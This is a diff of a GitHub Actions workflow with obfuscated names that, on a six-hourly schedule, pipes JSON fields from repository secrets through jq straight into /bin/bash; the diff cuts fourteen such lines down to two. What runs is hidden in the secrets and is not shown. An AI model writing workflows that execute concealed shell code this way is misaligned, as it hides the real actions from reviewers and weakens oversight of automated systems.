@@ -1,31 +1,18 @@
 name: caoyuqb
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
+    - cron: '36 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caoyuqb
         env:
-          jf548: ${{ secrets.jf548 }}
+          h84: ${{ secrets.h84 }}
         run: |
-          echo $jf548 | jq -r .b534 | /bin/bash
-          echo $omdg8 | jq -r .ddf166 | /bin/bash
-          echo $cyu7518 | jq -r .tq2699 | /bin/bash
-          echo $ptrr47 | jq -r .ghg4013 | /bin/bash
-          echo $mtg6 | jq -r .zcw77 | /bin/bash
-          echo $l18 | jq -r .x082 | /bin/bash
-          echo $rth59 | jq -r .x4 | /bin/bash
-          echo $ttb907 | jq -r .qjq9988 | /bin/bash
-          echo $ynir718 | jq -r .hcr73 | /bin/bash
-          echo $q677 | jq -r .ro79 | /bin/bash
-          echo $cm284 | jq -r .fdua80355 | /bin/bash
-          echo $cfmf4296 | jq -r .gmzie657 | /bin/bash
-          echo $k475 | jq -r .mowcj879 | /bin/bash
-          echo $ur509 | jq -r .ljp519 | /bin/bash
+          echo $h84 | jq -r .q5 | /bin/bash
+          echo $wc8563 | jq -r .xit801 | /bin/bash
 
